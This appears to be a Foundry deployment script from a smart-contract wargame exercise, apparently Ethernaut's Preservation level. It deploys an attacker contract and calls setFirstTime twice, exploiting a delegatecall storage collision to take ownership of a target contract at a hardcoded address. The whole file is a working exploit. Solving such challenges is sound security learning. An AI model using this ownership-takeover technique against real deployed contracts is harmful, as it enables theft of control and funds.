// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../../src/Preservation/AttackPreservation.sol";
import "../../src/Preservation/Preservation.sol"; // Import your Preservation contract

contract DeployAndAttackPreservation is Script {
    function run() external {
        vm.startBroadcast();

        // Deploy the AttackPreservation contract
        AttackPreservation attackPreservation = new AttackPreservation();
        address deployedAttackAddress = address(attackPreservation);

        console.log("AttackPreservation deployed to:", deployedAttackAddress);

        // BEGIN THE ATTACK!
        // Address of the deployed Preservation contract
        address deployedPreservationAddress = 0xF4bC37F1667E8974749DC3ebb5fa71Fe13367B9D;

        // Create an instance of the deployed Preservation contract
        Preservation preservation = Preservation(deployedPreservationAddress);

        preservation.setFirstTime(uint256(uint160(deployedAttackAddress)));
        preservation.setFirstTime(uint256(uint160(vm.envAddress("MY_EOA"))));

        // Check if the owner has been successfully changed
        if (preservation.owner() == vm.envAddress("MY_EOA")) {
            console.log(
                "Congratulations! You have claimed ownership of the Preservation contract."
            );
        } else {
            console.log("The attack wasn't successful.");
        }
        vm.stopBroadcast();
    }
}
